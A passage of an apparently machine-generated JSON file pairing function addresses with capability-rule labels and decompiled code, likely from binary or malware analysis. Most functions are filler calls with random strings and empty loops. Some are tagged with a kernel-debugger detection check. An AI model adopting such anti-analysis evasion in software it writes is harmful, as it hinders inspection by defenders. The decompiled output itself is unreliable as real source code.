uVar1 = fcn.004042dc(auStack152, auStack128);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack156 = 0x59; 0 < iStack156; iStack156 = iStack156 + -1) {\n        }\n    }\n    uStack24 = 1;\n    fcn.00401e79(\"mjfuwqpvpzbnfwaeltqzayuavhy\");\n    uStack24 = 3;\n    fcn.00401e79(\"mjfuwqpvpzbnfwaeltqzayuavhy\");\n    uVar1 = fcn.004042dc(auStack204, auStack180);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack208 = 0x5d; 0 < iStack208; iStack208 = iStack208 + -1) {\n        }\n    }\n    uStack24 = 1;\n    fcn.00401e79(\"fgxkfv\");\n    uStack24 = 2;\n    fcn.00401e79(\"fgxkfv\");\n    uVar1 = fcn.00405b37(auStack256, auStack232);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack260 = 0x5d; 0 < iStack260; iStack260 = iStack260 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0xab65;\n}\n",
        "token_count": 827
    },
    "004031d9": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004031d9(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack204;\n    int32_t iStack200;\n    uchar auStack196 [24];\n    uchar auStack172 [24];\n    int32_t iStack148;\n    ulong uStack144;\n    uchar uStack105;\n    uint uStack104;\n    uint uStack100;\n    uchar uStack93;\n    uint uStack68;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff18;\n    uStack28 = 0x4506e0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 2;\n    fcn.00401e79(\"lgic\");\n    uStack68 = 0xa7;\n    uStack24 = 3;\n    fcn.00401e79(\"uenvmryeovwkbojlhgbtrubykitxtmpmzyzz\");\n    uStack93 = 0;\n    uStack100 = 0x40f17780;\n    uStack104 = 0;\n    uStack105 = 0;\n    uStack24 = 4;\n    fcn.00401e79(\"lnedodwfvghfedljynnxqjskxctkaylzurlmygsmvwqveyxvxgun\");\n    uStack144 = *0x546df8;\n    for (iStack148 = 0x18; 0 < iStack148; iStack148 = iStack148 + -1) {\n    }\n    uStack24 = 5;\n    fcn.00401e79(\"lnedodwfvghfedljynnxqjskxctkaylzurlmygsmvwqveyxvxgun\");\n    uStack24 = 6;\n    fcn.00401e79(\"lnedodwfvghfedljynnxqjskxctkaylzurlmygsmvwqveyxvxgun\");\n    uVar1 = fcn.00405b37(auStack196, auStack172);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack200 = 0x33; 0 < iStack200; iStack200 = iStack200 + -1) {\n        }\n    }\n    for (iStack204 = 0x4f; 0 < iStack204; iStack204 = iStack204 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return;\n}\n",
        "token_count": 682
    },
    "004031ed": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004031ed(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    if ((-1 < arg_8h) && (arg_8h < *0x575488)) {\n        iVar3 = (arg_8h & 0x3f) * 0x38;\n        iVar1 = *((arg_8h >> 6) * 4 + 0x575220);\n        if (((*(iVar3 + 0x28 + iVar1) & 1) != 0) && (*(iVar3 + 0x18 + iVar1) != -1)) {\n            iVar1 = fcn.0040198d();\n            if (iVar1 == 1) {\n                if (arg_8h == 0) {\n                    uVar4 = 0xfffffff6;\n                }\n                else if (arg_8h == 1) {\n                    uVar4 = 0xfffffff5;\n                }\n                else {\n                    if (arg_8h != 2) goto code_r0x004cc249;\n                    uVar4 = 0xfffffff4;\n                }\n                (*_sym.imp.KERNEL32.dll_SetStdHandle)(uVar4, 0);\n            }\ncode_r0x004cc249:\n            *(iVar3 + 0x18 + *((arg_8h >> 6) * 4 + 0x575220)) = 0xffffffff;\n            return 0;\n        }\n    }\n    puVar2 = fcn.00403a35();\n    *puVar2 = 9;\n    puVar2 = fcn.0040185c();\n    *puVar2 = 0;\n    return 0xffffffff;\n}\n",
        "token_count": 391
    },
    "00403210": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 __cdecl fcn.00403210(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack220;\n    uchar auStack216 [24];\n    uchar auStack192 [24];\n    int32_t iStack168;\n    int32_t iStack164;\n    uchar auStack160 [24];\n    uchar auStack136 [27];\n    uchar uStack109;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar uStack46;\n    uchar uStack45;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff08;\n    uStack28 = 0x450780;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x2236;\n    uStack45 = 1;\n    uStack46 = 1;\n    uStack24 = 1;\n    fcn.00401e79(\"hpirqqlhjkkaufpiehcfadzwgdxlunxqxeptyovlmbjsshnwequgxtllmkdxkfmhkico\");\n    uStack76 = 0x40a48000;\n    uStack80 = 0;\n    uStack84 = 0x33e;\n    uStack24 = 2;\n    fcn.00401e79(\"cviglsjoevwk\");\n    uStack109 = 1;\n    uStack24 = 3;\n    fcn.00401e79(\"hpirqqlhjkkaufpiehcfadzwgdxlunxqxeptyovlmbjsshnwequgxtllmkdxkfmhkico\");\n    uStack24 = 5;\n    fcn.00401e79(\"hpirqqlhjkkaufpiehcfadzwgdxlunxqxeptyovlmbjsshnwequgxtllmkdxkfmhkico\");\n    uVar1 = fcn.00405b37(auStack160, auStack136);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack164 = 8; 0 < iStack164; iStack164 = iStack164 + -1) {\n        }\n    }\n    for (iStack168 = 0x5d; 0 < iStack168; iStack168 = iStack168 + -1) {\n    }\n    uStack24 = 3;\n    fcn.00401e79(\"hpirqqlhjkkaufpiehcfadzwgdxlunxqxeptyovlmbjsshnwequgxtllmkdxkfmhkico\");\n    uStack24 = 4;\n    fcn.00401e79(\"hpirqqlhjkkaufpiehcfadzwgdxlunxqxeptyovlmbjsshnwequgxtllmkdxkfmhkico\");\n    uVar1 = fcn.00405b37(auStack216, auStack192);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack220 = 0x45; 0 < iStack220; iStack220 = iStack220 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x546e34;\n}\n",
        "token_count": 862
    },
    "00403297": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403297(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_7ch;\n    uint var_78h;\n    int32_t var_74h;\n    int32_t var_70h;\n    uint var_6ch;\n    uint var_54h;\n    uchar var_3ah;\n    uchar var_39h;\n    uint var_38h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffff74;\n    var_14h = 0x450120;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 1;\n    fcn.00401e79(\"rwosfhdrcdxcyzzvetnxcefmrguhkfsainippmxgewcgvmmrruiubm\");\n    var_39h = 1;\n    var_3ah = 1;\n    var_10h = 2;\n    fcn.00401e79(\"rwosfhdrcdxcyzzvetnxcefmrguhkfsainippmxgewcgvmmrruiubm\");\n    var_10h = 3;\n    fcn.00401e79(\"rwosfhdrcdxcyzzvetnxcefmrguhkfsainippmxgewcgvmmrruiubm\");\n    uVar1 = fcn.00405b37(&var_6ch, &var_54h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_70h = 0x32; 0 < var_70h; var_70h = var_70h + -1) {\n        }\n    }\n    for (var_74h = 0x28; 0 < var_74h; var_74h = var_74h + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 521
    },
    "0040333c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 __cdecl fcn.0040333c(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack164;\n    uchar auStack160 [24];\n    uchar auStack136 [24];\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uchar uStack85;\n    uint uStack84;\n    uint uStack56;\n    uint uStack52;\n    uchar uStack45;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff40;\n    uStack28 = 0x450a60;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x2049;\n    uStack45 = 1;\n    uStack52 = 0x40f48240;\n    uStack56 = 0;\n    uStack24 = 1;\n    fcn.00401e79(\"cxvcjdfyzxchcapzvkrnxscynizakhrayfnfolhwxtffxicakxlmqavbcweslskvysstxaxoaxoztrorhmpskfytcxecitse\");\n    uStack84 = 0x109;\n    uStack85 = 0;\n    uStack92 = 0x40a63a00;\n    uStack96 = 0;\n    uStack100 = 0x40c1b700;\n    uStack104 = 0;\n    uStack108 = 0x40d31f80;\n    uStack112 = 0;\n    uStack24 = 2;\n    fcn.00401e79(\"cxvcjdfyzxchcapzvkrnxscynizakhrayfnfolhwxtffxicakxlmqavbcweslskvysstxaxoaxoztrorhmpskfytcxecitse\");\n    uStack24 = 3;\n    fcn.00401e79(\"cxvcjdfyzxchcapzvkrnxscynizakhrayfnfolhwxtffxicakxlmqavbcweslskvysstxaxoaxoztrorhmpskfytcxecitse\");\n    uVar1 = fcn.004042dc(auStack160, auStack136);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack164 = 0x2e; 0 < iStack164; iStack164 = iStack164 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x546ee4;\n}\n",
        "token_count": 691
    },
    "00403350": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00403350(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t in_ECX;\n    uint var_2ch;\n    uint var_24h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = arg_ch & 1;\n    *(in_ECX + 0xc) = arg_8h & 0x17;\n    var_ch = arg_8h & 0x17 & *(in_ECX + 0x10);\n    if (var_ch != 0) {\n        if ((arg_ch & 1) != 0) {\n            fcn.004067ee(0, 0);\n        }\n        if ((var_ch & 4) == 0) {\n            if ((var_ch & 2) == 0) {\n                var_10h = 0x545f80;\n            }\n            else {\n                var_10h = 0x545f66;\n            }\n        }\n        else {\n            var_10h = 0x545f4d;\n        }\n        fcn.00404430(&var_2ch, 1);\n        fcn.00406401(var_10h, &var_2ch);\n        fcn.004067ee(&var_24h, 0x566b6c);\n    }\n    return;\n}\n",
        "token_count": 344
    },
    "00403391": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00403391(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack116;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x418050;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 1;\n    fcn.00401e79(\"qjhzedzudn\");\n    uStack24 = 2;\n    fcn.00401e79(\"jymtijpmlsofjsofuit\");\n    for (iStack116 = 4; 0 < iStack116; iStack116 = iStack116 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0;\n}\n",
        "token_count": 244
    },
    "0040344f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0040344f(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack220;\n    uchar auStack216 [24];\n    uchar auStack192 [24];\n    uint uStack168;\n    uint uStack164;\n    uchar uStack154;\n    uchar uStack153;\n    uint uStack152;\n    uint uStack76;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff08;\n    uStack28 = 0x44fe60;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x40b11e00;\n    uStack48 = 0;\n    uStack24 = 1;\n    fcn.00401e79(\"geijbcggrgsjuwznyyuqzthcfphgtsfzyooyzdgbgjaisduxaydlyscggemdkjmqjxasbluzuo\");\n    uStack76 = 0x1146;\n    uStack24 = 2;\n    fcn.00401e79(\"iuuslsljuzfzqtcqotbnurjuznywoylapnmkinbzxywnprciprhrteoqw\");\n    uStack24 = 3;\n    fcn.00401e79(\"uzjyaktiihiztuplktzvzsclholllngysgjiakgarwbeaadvuby\");\n    uStack24 = 4;\n    fcn.00401e79(\"srnaptuhejhqwiwscszlzhxltsvbnzbajsndalz\");\n    uStack152 = 0x1ee;\n    uStack153 = 0;\n    uStack154 = 0;\n    uStack164 = 0x40d2f480;\n    uStack168 = 0;\n    uStack24 = 5;\n    fcn.00401e79(\"srnaptuhejhqwiwscszlzhxltsvbnzbajsndalz\");\n    uStack24 = 6;\n    fcn.00401e79(\"srnaptuhejhqwiwscszlzhxltsvbnzbajsndalz\");\n    uVar1 = fcn.00405b37(auStack216, auStack192);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack220 = 8; 0 < iStack220; iStack220 = iStack220 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return;\n}\n",
        "token_count": 710
    },
    "004034bd": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004034bd(uint *arg_8h)\n\n{\n    uint32_t *puVar1;\n    \n    puVar1 = arg_8h + 3;\n    if (((*puVar1 >> 0xd & 1) != 0) && ((*puVar1 >> 6 & 1) != 0)) {\n        fcn.0040640b(arg_8h[1]);\n        LOCK();\n        *puVar1 = *puVar1 & 0xfffffebf;\n        arg_8h[1] = 0;\n        *arg_8h = 0;\n        arg_8h[2] = 0;\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "004035df": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.004035df(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack132;\n    uchar auStack128 [24];\n    uchar auStack104 [24];\n    int32_t iStack80;\n    uint uStack76;\n    ulong uStack72;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff60;\n    uStack28 = 0x451500;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 1;\n    fcn.00401e79(\"lxzccxaajzsocrsiavteittfuxydrqrxxdfgmwdpokqiquiudzsukacomlbgkznibmxlho\");\n    uStack72 = *0x547368;\n    uStack76 = 0x420;\n    for (iStack80 = 0x22; 0 < iStack80; iStack80 = iStack80 + -1) {\n    }\n    uStack24 = 2;\n    fcn.00401e79(\"lxzccxaajzsocrsiavteittfuxydrqrxxdfgmwdpokqiquiudzsukacomlbgkznibmxlho\");\n    uStack24 = 3;\n    fcn.00401e79(\"lxzccxaajzsocrsiavteittfuxydrqrxxdfgmwdpokqiquiudzsukacomlbgkznibmxlho\");\n    uVar1 = fcn.00405b37(auStack128, auStack104);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack132 = 0x31; 0 < iStack132; iStack132 = iStack132 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0xa2d4;\n}\n",
        "token_count": 524
    },
    "0040360c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.0040360c(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack132;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x450bc0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 0;\n    fcn.00401e79(\"gtxzzprafulwhqnewskhciqptzpuuydptrkacxsskqvbwqhkoodjecnbkgptywkgviapfgfmjxgfw\");\n    uStack24 = 1;\n    fcn.00401e79(\"comwyghqdgsjufmttstvbjcdwucpocdsfvmrdicp\");\n    for (iStack132 = 0x5a; 0 < iStack132; iStack132 = iStack132 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0;\n}\n",
        "token_count": 286
    },
    "00403625": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00403625(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x450da0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 3;\n    fcn.00401e79(\"dokyyytsavphosevevnfrecbqnefaydssnvqqkopjtoiff\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0;\n}\n",
        "token_count": 203
    },
    "00403643": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n\nuint __cdecl fcn.00403643(uint arg_8h)\n\n{\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00403b02(&stack0x0000001c, &stack0x00000040, &stack0x0000005c, 0x1014, 0x211);\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    return 0;\n}\n",
        "token_count": 214
    },
    "00403684": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00403684(uint32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    \n    if (arg_8h < 0x100) {\n        if ((*(\n              L\"         (((((                  H\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0181\u0181\u0181\u0181\u0181\u0181\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\\x10\\x10\\x10\\x10\\x10\u0182\u0182\u0182\u0182\u0182\u0182\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\\x10\\x10\\x10      (                          \\b\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0112\\x10\\x100\\x10\\x10\\x10\\x10\\x14\\x14\\x10\u0112\\x10\\x10\\x10\\x14\u0112\\x10\\x10\\x10\\x10\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0101\"\n              + (arg_8h & 0xff)) & 1) != 0) {\n            arg_8h = *((arg_8h & 0xff) + *(*arg_ch + 0x94));\n        }\n        return arg_8h & 0xff;\n    }\n    uVar1 = fcn.004023b5(arg_8h, arg_ch);\n    return uVar1;\n}\n",
        "token_count": 485
    },
    "004036b1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.004036b1(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint noname_4, uint arg_1ch)\n\n{\n    fcn.00401e79(\"fadlvecwnuiahrswanaduizwyuiknnpoglsjazloiuamfkh\");\n    fcn.00403b02();\n    return *0x546e64;\n}\n",
        "token_count": 102
    },
    "00403855": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 __cdecl fcn.00403855(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack136;\n    uchar auStack132 [24];\n    uchar auStack108 [24];\n    int32_t iStack84;\n    int32_t iStack80;\n    uchar uStack73;\n    ulong uStack72;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff60;\n    uStack28 = 0x450a20;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 0;\n    fcn.00401e79(\"wvfegafenpjhlprtoctillhjzbnlwiyfbiwapmdkkxpksbgxibdgphydzeojtlvo\");\n    uStack72 = *0x546ea8;\n    uStack73 = 0;\n    for (iStack80 = 0; 0 < iStack80; iStack80 = iStack80 + -1) {\n    }\n    for (iStack84 = 0x51; 0 < iStack84; iStack84 = iStack84 + -1) {\n    }\n    uStack24 = 1;\n    fcn.00401e79(\"wvfegafenpjhlprtoctillhjzbnlwiyfbiwapmdkkxpksbgxibdgphydzeojtlvo\");\n    uStack24 = 2;\n    fcn.00401e79(\"wvfegafenpjhlprtoctillhjzbnlwiyfbiwapmdkkxpksbgxibdgphydzeojtlvo\");\n    uVar1 = fcn.004042dc(auStack132, auStack108);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack136 = 0x42; 0 < iStack136; iStack136 = iStack136 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x546ec4;\n}\n",
        "token_count": 542
    },
    "00403864": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.00403864(uint arg_8h, uint arg_ch, uint arg_10h, uint noname_3, uint arg_18h, uint arg_1ch, char *arg_20h, \n            uint32_t arg_24h)\n\n{\n    uchar uVar1;\n    uint32_t uVar2;\n    uint8_t **ppuVar3;\n    uint uVar4;\n    uchar *puVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t *in_FS_OFFSET;\n    bool bVar8;\n    ulong uVar9;\n    uint32_t var_12ch;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    bool var_109h;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f5h;\n    uint var_ech;\n    uint var_e4h;\n    uint var_dch;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b4h;\n    uint var_ach;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_94h;\n    uint32_t var_8ch;\n    int32_t var_88h;\n    char *var_84h;\n    uint32_t var_80h;\n    char var_79h;\n    uint var_78h;\n    uint var_60h;\n    uint var_58h;\n    uint var_54h;\n    uint var_3ch;\n    uint var_34h;\n    uint32_t var_30h;\n    uint16_t var_2ah;\n    uint32_t var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    _arg_10h = CONCAT44(noname_3, arg_10h);\n    var_1ch = &stack0xfffffeb4;\n    var_10h = 0xffffffff;\n    var_14h = 0x4272e0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_f5h._0_1_ = false;\n    if (arg_24h != 0) {\n        var_109h = true;\n        if (*arg_20h != '+') {\n            var_109h = *arg_20h == '-';\n        }\n        var_f5h._0_1_ = var_109h;\n  